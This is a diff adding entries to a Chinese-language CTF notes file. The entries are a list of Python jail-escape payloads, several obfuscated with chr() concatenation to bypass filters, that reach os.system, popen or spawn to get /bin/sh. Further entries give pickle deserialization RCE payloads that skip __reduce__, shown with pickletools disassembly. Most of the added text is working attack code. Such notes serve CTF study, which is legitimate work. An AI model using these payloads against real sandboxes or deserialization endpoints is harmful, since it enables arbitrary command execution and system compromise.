@@ -319,6 +319,25 @@ print函数可正常使用。
 ```python
 gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
 ```
+- `print.__self__.__import__("os").system("cmd")`。绕过滤版本：`print.__self__.getattr(print.__self__.getattr(print.__self__, print.__self__.chr(95) + print.__self__.chr(95) + print.__self__.chr(105) + print.__self__.chr(109) + print.__self__.chr(112) + print.__self__.chr(111) + print.__self__.chr(114) + print.__self__.chr(116) + print.__self__.chr(95) + print.__self__.chr(95))(print.__self__.chr(111) + print.__self__.chr(115)), print.__self__.chr(115) + print.__self__.chr(121) + print.__self__.chr(115) + print.__self__.chr(116) + print.__self__.chr(101) + print.__self__.chr(109))("cmd")`
+- 尝试读函数源码
+```py
+print(<func>.__code__) #获取文件名，func为文件内的函数名
+print(<fund>.__code__.co_names) #获取函数内调用的函数
+print(<func>.__code__.co_code) #函数的字节码
+print(<func>.__code__.co_consts) #函数内直接定义的常量
+print(<func>.__code__.co_varnames) #函数内定义的变量
+#https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/pygulag ，内含字节码反编译脚本
+```
+- `print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])`
+- `print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))`
+- `print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))`
+- `print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["filename"]),print.__self__.credits()`,打印文件内容
+- `print(globals.__self__.__import__("os").system("cmd"))`
+- `print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cmd').read())`
+- `print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cmd'))`
+- `print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))`
+- `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
 
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 
@@ -605,3 +624,28 @@ chain.puts(file.bss()) #puts输出内容
 - pwntools自带多线程爆破用的函数。[mbruteforce](https://docs.pwntools.com/en/stable/util/iters.html#pwnlib.util.iters.mbruteforce):`mbruteforce(pwn, string.digits, 5, threads=64)`，其中第一个参数是要多线程爆破的函数，返回值为bool，只要返回值为True函数就会停止调用。第二个和第三个参数用来指定调用函数时用的参数。如果没有参数直接随便填然后调用的函数不用参数就行了。
 - 对于爆破的题目，可能很难找到切interactive的时机。保险起见，可以直接在pwntools里发送cat flag之类的命令，然后接收就好了
 - 格式化字符串漏洞题基本两次printf就够了。一次泄露地址，一次将one gadget写入返回地址。做法很多，改got表也行，但第一次漏洞的泄露地址是必须的。
+71. [Irreductible](https://github.com/deyixtan/ctf/tree/main/challenges/hero-ctf-2023/misc-irreductible)
+- 不使用`__reduce__`函数的pickle反序列化rce：https://heartathack.club/blog/pickle-RCE-without-reduce
+    - 使用OBJ：
+```python
+>>> payload_obj
+b'(cos\nsystem\nS"cat flag.txt"\no.'
+>>> pickletools.dis(payload_obj)
+    0: (    MARK
+    1: c        GLOBAL     'os system'
+   12: S        STRING     'cat flag.txt'
+   28: o        OBJ        (MARK at 0)
+   29: .    STOP
+#hex: 28636f730a73797374656d0a532263617420666c61672e747874220a6f2e
+```
+    - 使用INST：
+```python
+>>> payload_inst
+b'(S"cat flag.txt"\nios\nsystem\n.'
+>>> pickletools.dis(payload_inst)
+    0: (    MARK
+    1: S        STRING     'cat flag.txt'
+   17: i        INST       'os system' (MARK at 0)
+   28: .    STOP
+#hex:28532263617420666c61672e747874220a696f730a73797374656d0a2e
+```
